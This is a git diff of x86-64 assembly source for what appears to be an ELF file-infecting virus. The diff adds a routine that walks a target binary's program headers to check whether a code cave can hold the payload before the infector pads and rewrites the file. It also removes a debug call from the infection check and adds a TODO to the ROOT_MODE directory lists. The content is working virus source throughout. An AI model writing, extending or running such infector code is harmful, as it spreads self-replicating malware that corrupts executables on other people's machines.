@@ -477,6 +477,16 @@ infect_single_file:
     test rax, rax
     jnz .close_munmap
 
+    ; its not infected, check if our MAX_FILE_PAD is big enough
+    ; to make a codecave
+    push rcx
+    mov rdi, r9
+    mov rsi, MAX_FILE_PAD
+    call check_codecave_avail
+    pop rcx
+    test rax, rax
+    jz .close_munmap
+
     ; ftruncate to add 0x1000 (4096) bytes (hardcoded offset here)
     mov rdi, r8
     mov rsi, r10
@@ -555,6 +565,78 @@ infect_single_file:
     ret
 
 ; rdi - mmaped buffer
+; rsi - MAX_FILE_PAD
+; returns 1 if avail and 0 otherwise
+check_codecave_avail:
+    push rbx
+    push r8
+    push r9
+    push r10
+
+	mov rax, rsi ; MAX_FILE_PAD -> rax
+
+    mov r8, 0 ; furthest vaddr -> r8 
+
+    mov r9, 0 ; furthest addr phnum -> r9
+
+	mov rsi, rdi
+    add rdi, 0x40 ; pheader table addr -> rdi
+    
+    add rsi, 0x38
+    movzx rsi, word [rsi] ; phnum  -> rsi
+    mov rbx, 0
+
+.loop:
+    cmp rbx, rsi
+    je .loop_end
+
+    ; vaddr -> rdx 
+    mov rdx, qword [rdi + pheader.p_vaddr]
+    
+    ; vaddr + size in mem -> rcx
+    mov rcx, qword [rdi + pheader.p_memsz]
+    add rcx, rdx
+
+    ; is it bigger than curr furthest vaddr? if no, continue
+    cmp rcx, r8
+    jle .loop_iter
+
+    ; if yes, set num and furthest addr
+    mov r8, rcx
+    mov r9, rbx
+
+
+.loop_iter:
+    add rbx, 1
+    add rdi, 0x38
+    jmp .loop
+
+.loop_end:
+
+    ; get offset 
+    sub rsi, r9
+    imul rsi, 0x38
+    sub rdi, rsi
+
+    mov rdx, qword [rdi + pheader.p_memsz] 
+    sub rdx, qword [rdi + pheader.p_filesz] ; dst offset for mempad -> rdx
+
+    ; compare rdx with rax (MAX_FILE_PAD - PL_SIZE) - which is how many space we have left for uninit vars
+    sub rax, PL_SIZE
+    cmp rdx, rax
+    mov rax, 1
+    jl .ret
+
+    mov rax, 0
+
+.ret:
+	pop r10
+    pop r9
+    pop r8
+    pop rbx
+    ret
+
+; rdi - mmaped buffer
 ; rsi - entry offset
 ; returns 1 if infected and 0 otherwise
 check_infected:
@@ -567,7 +649,6 @@ check_infected:
     sub rsi, rax
     sub rsi, 1 ; for the nullbyte
     mov rdx, 5 ; just compare 5 bytes only lah
-    call break ; check if values are OK
     call memcmp
 
     test rax, rax
@@ -1180,6 +1261,7 @@ null db 0
 ; excl_dir db `.`, 0, `..`, 0, `etc`, 0, `proc`, 0, `sys`, 0, `dev`, 0, `lost+found`, 0, `media`, 0, `mnt`, 0, `opt`, 0, `proc`, 0, `boot`, 0, `run`, 0, `var`, 0, 0
 
 %ifdef ROOT_MODE
+; TODO: mystery of grub-mkrescue - solve for super big uninit section
 ; TODO: replace this w/ system root
 root_dirs db `/tmp/test`, 0, `/tmp/test2`,0,0
 excl_dir db `.`, 0, `..`, 0, 0
